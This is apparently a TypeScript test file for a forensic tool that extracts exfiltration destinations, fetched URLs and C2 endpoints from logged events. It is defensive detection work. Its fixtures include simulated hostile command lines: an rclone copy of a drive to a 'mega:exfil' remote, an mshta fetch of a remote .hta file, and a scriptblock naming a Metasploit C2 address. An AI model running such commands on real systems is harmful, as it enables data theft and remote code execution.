import { describe, it, expect } from "vitest";
import { renderDestinationTags } from "../../src/analysis/destinationFacts.js";
import type { ForensicEvent } from "../../src/analysis/stateTypes.js";

function ev(p: Partial<ForensicEvent>): ForensicEvent {
  return {
    id: p.id ?? "e1",
    timestamp: "2026-01-01T00:00:00Z",
    description: p.description ?? "x",
    severity: p.severity ?? "High",
    mitreTechniques: [],
    relatedFindingIds: [],
    sourceScreenshots: [],
    ...p,
  };
}

// Real shape from INC-2026-033: the remote sits past the 240-char prompt cut, and the row is itself a
// renamed cmd.exe — the destination is still a fact the analyst asks about first (#1502).
const RCLONE_CMD =
  '"C:\\Users\\Public\\Sim\\hosts\\FILE01\\C\\Temp\\rclone.exe" /d /v:off /c echo CANARY rclone.exe copy X:\\ mega:exfil --config rclone.conf --transfers 8 ';

describe("renderDestinationTags — rclone", () => {
  it("names the destination remote of a copy as <dest:…>", () => {
    expect(renderDestinationTags(ev({ commandLine: RCLONE_CMD }))).toEqual(["<dest:mega:exfil>"]);
  });

  it("treats the remote in the SOURCE slot as a remote, not a destination", () => {
    const tags = renderDestinationTags(ev({ commandLine: "rclone copy mega:inbound C:\\restore" }));
    expect(tags).toEqual(["<rclone-remote:mega:inbound>"]);
  });

  it("handles sync/move/copyto/moveto and options before the verb", () => {
    expect(
      renderDestinationTags(ev({ commandLine: "rclone --config x.conf sync D:\\share b2:bucket/dir" })),
    ).toEqual(["<dest:b2:bucket/dir>"]);
    expect(
      renderDestinationTags(ev({ commandLine: "rclone.exe moveto 'C:\\a b\\f.zip' 'gd:out/f.zip'" })),
    ).toEqual(["<dest:gd:out/f.zip>"]);
  });

  it("does not mistake a Windows drive for a remote", () => {
    expect(renderDestinationTags(ev({ commandLine: "rclone copy C:\\src D:\\dst" }))).toEqual([]);
    expect(renderDestinationTags(ev({ commandLine: "rclone copy C:\\src X:" }))).toEqual([]);
  });

  it("a one-letter remote with a path is still a remote", () => {
    expect(renderDestinationTags(ev({ commandLine: "rclone copy C:\\src m:loot" }))).toEqual([
      "<dest:m:loot>",
    ]);
  });

  it("a listing/mount verb names the remote neutrally", () => {
    expect(renderDestinationTags(ev({ commandLine: "rclone lsd mega:" }))).toEqual(["<rclone-remote:mega:>"]);
  });

  it("reads the command line out of the description when no commandLine field is set", () => {
    const d =
      "Sysmon Process create (EID 1) - Image=C:\\T\\rclone.exe - CommandLine=rclone copy X:\\ mega:exfil";
    expect(renderDestinationTags(ev({ description: d }))).toEqual(["<dest:mega:exfil>"]);
  });
});

describe("renderDestinationTags — URLs", () => {
  it("names the URL an mshta/curl/wget command fetches", () => {
    const cmd =
      '"C:\\T\\mshta.exe" /c echo CANARY mshta http://203.0.113.22:443/UsySLX1n.hta ^(actual local inert file^) ';
    expect(renderDestinationTags(ev({ commandLine: cmd }))).toEqual([
      "<url:http://203.0.113.22:443/UsySLX1n.hta>",
    ]);
  });

  it("dedupes, keeps at most three URLs, strips trailing punctuation but keeps a query string", () => {
    const cmd =
      "curl https://a.example/x?y=1&z=2, wget https://a.example/x?y=1&z=2 https://b.example/ https://c.example/ https://d.example/";
    const tags = renderDestinationTags(ev({ commandLine: cmd }));
    expect(tags).toEqual([
      "<url:https://a.example/x?y=1&z=2>",
      "<url:https://b.example/>",
      "<url:https://c.example/>",
    ]);
  });

  it("does not also emit an <endpoint:> for the host:port inside a captured URL", () => {
    const tags = renderDestinationTags(ev({ commandLine: "mshta http://203.0.113.22:443/a.hta" }));
    expect(tags.some((t) => t.startsWith("<endpoint:"))).toBe(false);
  });
});

describe("renderDestinationTags — ip:port endpoints", () => {
  // The script block's port lives only in `message`; the importer clipped it out of the description.
  const MESSAGE =
    "Creating Scriptblock text (1 of 1):\nfunction Invoke-Sim {\r\n  Invoke-DecoyProcess $mshta 'mshta http://203.0.113.22:443/UsySLX1n.hta'\r\n" +
    "  Invoke-LoopbackPort 443 '203.0.113.22:443 HTA server';Invoke-LoopbackPort 4321 '203.0.113.22:4321 Metasploit C2'\r\n" +
    "  $forward = '127.0.0.1:4321'\r\n}";

  it("reads endpoints out of the message, labels a c2-named one and a loopback one", () => {
    const tags = renderDestinationTags(ev({ message: MESSAGE }));
    expect(tags).toContain("<url:http://203.0.113.22:443/UsySLX1n.hta>");
    expect(tags).toContain("<endpoint:203.0.113.22:4321 (labelled c2)>");
    expect(tags).toContain("<local-endpoint:127.0.0.1:4321>");
    // 203.0.113.22:443 is inside the captured URL — not repeated as an endpoint.
    expect(tags.some((t) => t.includes("203.0.113.22:443") && !t.startsWith("<url:"))).toBe(false);
  });

  it("rejects an invalid octet or port and a hash that merely contains digits", () => {
    const tags = renderDestinationTags(
      ev({
        message: "image_sha256: 5497dd84321887d18b62fae35689ea4a 999.1.1.1:80 10.0.0.1:70000 10.0.0.1:0",
      }),
    );
    expect(tags).toEqual([]);
  });

  it("skips the row's own dstIp:port, which the <net:> tag already states", () => {
    const tags = renderDestinationTags(
      ev({ dstIp: "203.0.113.9", port: 8443, message: "beacon 203.0.113.9:8443" }),
    );
    expect(tags).toEqual([]);
  });

  it("caps endpoints at four distinct pairs", () => {
    const msg = Array.from({ length: 7 }, (_, i) => `10.0.0.${i + 1}:80${i}`).join(" ");
    const tags = renderDestinationTags(ev({ message: msg }));
    expect(tags.filter((t) => t.startsWith("<endpoint:")).length).toBe(4);
  });

  it("only reads the head of a very long message", () => {
    const msg = "x".repeat(10_000) + " 203.0.113.5:4444";
    expect(renderDestinationTags(ev({ message: msg }))).toEqual([]);
  });
});

describe("renderDestinationTags — integrity", () => {
  it("emits nothing for a bare row", () => {
    expect(renderDestinationTags(ev({ description: "Logon 4624 user@host" }))).toEqual([]);
  });

  it("strips angle brackets and control characters from a value so a tag stays one tag", () => {
    const tags = renderDestinationTags(
      ev({ commandLine: "curl https://a.example/x\u0007y<b> rclone copy C:\\s mega:<x>" }),
    );
    expect(tags).toEqual(["<dest:mega:x>", "<url:https://a.example/xy>"]);
  });

  it("drops whole tags past the block budget instead of slicing one in half", () => {
    const urls = Array.from({ length: 3 }, (_, i) => `https://${"h".repeat(100)}${i}.example/`).join(" ");
    const tags = renderDestinationTags(ev({ commandLine: urls }));
    for (const t of tags) expect(t.endsWith(">")).toBe(true);
    expect(tags.join(" ").length).toBeLessThanOrEqual(200);
  });
});
